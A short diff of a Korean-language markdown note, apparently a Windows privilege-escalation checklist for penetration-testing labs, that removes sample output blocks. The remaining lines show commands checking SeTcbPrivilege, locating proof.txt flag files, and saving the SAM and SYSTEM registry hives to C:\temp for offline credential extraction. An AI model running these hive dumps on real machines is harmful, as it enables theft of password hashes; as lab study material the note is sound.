@@ -9,18 +9,10 @@
 whoami /priv | findstr /i "SeTcb"
 ```
 
-```text
-SeTcbPrivilege                Act as part of the operating system       Enabled
-```
-
 - 보통 SYSTEM 계정에만 있다. 일반 서비스 계정에는 거의 없음
 
 ```powershell
 whoami
-```
-
-```text
-nt authority\system
 ```
 
 ## 2. 토큰 확인
@@ -50,8 +42,4 @@ dir C:\Users\*\Desktop\local.txt C:\Users\*\Desktop\proof.txt
 ```powershell
 reg save HKLM\SAM C:\temp\SAM
 reg save HKLM\SYSTEM C:\temp\SYSTEM
-```
-
-```text
-The operation completed successfully.
 ```
